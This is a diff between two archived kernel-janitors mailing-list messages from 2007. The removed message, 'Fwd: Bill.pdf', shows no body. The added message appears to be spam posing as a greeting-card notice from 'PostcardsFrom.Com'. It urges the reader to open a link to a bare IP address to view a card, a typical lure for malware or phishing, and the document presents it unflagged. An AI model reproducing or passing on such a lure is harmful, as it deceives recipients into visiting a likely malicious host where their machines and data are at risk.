@@ -1,30 +1,44 @@
-From: Jim Rios <inpeg@look.ca>
-Date: Sun, 08 Jul 2007 11:55:20 +0000
-Subject: [KJ] Fwd: Bill.pdf
-Message-Id: <4690D0A8.7060506@look.ca>
-MIME-Version: 1
-Content-Type: multipart/mixed; boundary="------------010808040005010807030503"
+From: "PostcardsFrom.Com" <gal@mail.weber.edu>
+Date: Tue, 03 Jul 2007 19:09:47 +0000
+Subject: [KJ] Independence Day At The Park
+Message-Id: <000601c7bda5$b9407050$18b69120@sw.qyoj>
 List-Id: <kernel-janitors.vger.kernel.org>
+MIME-Version: 1.0
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
 To: kernel-janitors@vger.kernel.org
 
---------------010808040005010807030503
-Content-Type: text/plain; charset=windows-1250; format=flowed
-Content-Transfer-Encoding: 7bit
+Hi. Family member has sent you a greeting card.
+See your card as often as you wish during the next 15 days.
+
+SEEING YOUR CARD
+
+If your email software creates links to Web pages, click on your 
+card's direct www address below while you are connected to the Internet:
+
+http://69.182.129.232/?85da463c5c036b0339eb3a6075338ee7c634
+
+Or copy and paste it into your browser's "Location" box (where Internet 
+addresses go).
+     
 
 
+PRIVACY
+PostcardsFrom.Com honors your privacy. Our home page and Card Pick Up have links to our 
+Privacy Policy.
 
---------------010808040005010807030503
-Content-Type: text/plain; charset="us-ascii"
-MIME-Version: 1.0
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline
+TERMS OF USE
+By accessing your card you agree we have no liability. 
+If you don't know the person sending the card or don't wish to see the card, 
+please disregard this Announcement.
+
+We hope you enjoy your awesome card.
+
+Wishing you the best,
+Webmaster,
+PostcardsFrom.Com
 
 _______________________________________________
-REMINDER: this mailing list moved to vger.kernel.org and current one will be discontinued soon.
-To resubscribe, send email to majordomo@vger.kernel.org with
-&quot;subscribe kernel-janitors&quot; in message body and follow instructions.
-
 Kernel-janitors mailing list
 Kernel-janitors@lists.linux-foundation.org
 https://lists.linux-foundation.org/mailman/listinfo/kernel-janitors
---------------010808040005010807030503--
